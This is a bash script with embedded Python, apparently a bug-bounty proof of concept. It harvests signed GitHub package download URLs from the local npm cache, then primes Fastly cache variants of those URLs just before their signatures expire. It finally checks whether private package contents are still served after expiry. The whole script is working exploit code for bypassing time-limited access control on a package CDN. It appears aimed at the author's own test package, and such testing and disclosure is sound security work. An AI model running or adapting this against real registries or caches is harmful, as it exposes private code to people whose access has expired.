#!/bin/bash
set -euo pipefail
python3 - <<'PY'
import re,urllib.parse,urllib.request,urllib.error,time,hashlib,io,tarfile,json,pathlib,html,http.client,ssl,xml.etree.ElementTree as ET
EXPECTED='9ed76c23fbb1516e4afeae78a5913e3cdea697ae349011187d6032de21d08c44'
pat=re.compile(rb'https://pkg-npm\.githubusercontent\.com/[^\s"\'<>\\,}\]]+')
urls=[]
for p in (pathlib.Path.home()/'.npm').rglob('*'):
 if not p.is_file():continue
 try:data=p.read_bytes()
 except:continue
 for m in pat.findall(data):
  try:u=html.unescape(m.decode()).rstrip(').;,]}')
  except:continue
  if u not in urls:urls.append(u)
print('CACHE_URL_FOUND',int(bool(urls)),'COUNT',len(urls))
models=[]
for u in urls:
 q=urllib.parse.parse_qs(urllib.parse.urlsplit(u).query);se=q.get('se',[None])[0]
 if not se or 'sig' not in q:continue
 exp=__import__('datetime').datetime.fromisoformat(se.replace('Z','+00:00')).timestamp()
 models.append((u,exp))
 print('URL_MODEL',json.dumps({'url_sha256':hashlib.sha256(u.encode()).hexdigest(),'length':len(u),'query_keys':sorted(q),'expiry_epoch':exp,'remaining':round(exp-time.time(),3)}))
if not models:raise SystemExit('no complete signed URL')
# Complete copy is the longest; the shorter log copy is known truncated and is kept only as a control.
original,exp=max(models,key=lambda x:len(x[0]))
print('DIRECT_CONTROLS',json.dumps({'private_repo_unauth':None,'private_registry_unauth':None}))
def code(url):
 try:
  with urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent':'bb-team-own-control'}),timeout=20) as r:return r.status
 except urllib.error.HTTPError as e:return e.code
print('DIRECT_CONTROLS_RESULT',json.dumps({'private_repo_unauth':code('https://api.github.com/repos/mr-benty/hc-pkgcache-src-1788220522'),'private_registry_unauth':code('https://npm.pkg.github.com/@mr-benty%2fhc-pkgcache-1788220522')}))
# Wait until late enough that a fresh cache entry must outlive the SAS.
if time.time()<exp-25:time.sleep(exp-25-time.time())
u=urllib.parse.urlsplit(original);pairs=urllib.parse.parse_qsl(u.query,keep_blank_values=True)
def build(ps):return urllib.parse.urlunsplit((u.scheme,u.netloc,u.path,urllib.parse.urlencode(ps,doseq=True),'') )
variants=[('reverse',build(list(reversed(pairs)))),('rotate',build(pairs[1:]+pairs[:1])),('extra',build(pairs+[('hc_late','1')]))]
conn=http.client.HTTPSConnection(u.hostname,timeout=30,context=ssl.create_default_context())
def fetch(label,url):
 x=urllib.parse.urlsplit(url);target=x.path+('?' + x.query if x.query else '')
 conn.request('GET',target,headers={'User-Agent':'bb-team-own-object','Connection':'keep-alive'});r=conn.getresponse();body=r.read();h={k.lower():v for k,v in r.getheaders()};marker=False;err=None
 if r.status==200:
  try:
   with tarfile.open(fileobj=io.BytesIO(body),mode='r:gz') as tf:marker=hashlib.sha256(tf.extractfile('package/secret.txt').read()).hexdigest()==EXPECTED
  except:pass
 else:
  try:err=ET.fromstring(body).findtext('Code')
  except:pass
 out={'label':label,'epoch':time.time(),'seconds_vs_exp':round(time.time()-exp,3),'status':r.status,'bytes':len(body),'sha256':hashlib.sha256(body).hexdigest(),'private_marker_match':marker,'error_code':err,'x_cache':h.get('x-cache'),'x_cache_hits':h.get('x-cache-hits'),'x_served_by':h.get('x-served-by'),'age':h.get('age')};print(label,json.dumps(out));return out
chosen=None
for label,v in variants:
 arm=fetch('VARIANT_'+label,v)
 if arm['status']==200 and arm['private_marker_match'] and arm.get('x_cache') and arm['x_cache'].split(',')[0].strip()=='MISS':chosen=(label,v,arm);break
if not chosen:raise SystemExit('no origin-equivalent Fastly-distinct variant; late reprime unavailable')
label,v,prime=chosen
hit=fetch('LATE_PRIME_HIT_'+label,v)
if not(hit['status']==200 and hit['private_marker_match'] and 'HIT' in (hit.get('x_cache') or '')):raise SystemExit('late variant did not become HIT')
# Keep connection and entry alive; prove exact same node immediately before expiry.
while time.time()<exp-1.2:
 time.sleep(min(5,max(0,exp-1.2-time.time())))
 if time.time()>=exp-1.2:break
 fetch('KEEPALIVE_'+label,v)
late=fetch('LAST_VALID_'+label,v)
if not(late['status']==200 and late['private_marker_match'] and 'HIT' in (late.get('x_cache') or '')):raise SystemExit('no late valid HIT')
if time.time()<exp+5:time.sleep(exp+5-time.time())
post=fetch('POST_EXPIRY_'+label,v)
print('VERDICT',json.dumps({'converted':post['status']==200 and post['private_marker_match'] and 'HIT' in (post.get('x_cache') or ''),'prime_node':prime.get('x_served_by'),'late_node':late.get('x_served_by'),'post_node':post.get('x_served_by'),'same_node':late.get('x_served_by')==post.get('x_served_by')}))
if not(post['status']==200 and post['private_marker_match'] and 'HIT' in (post.get('x_cache') or '')):raise SystemExit('late-primed equivalent URL did not survive expiry')
PY
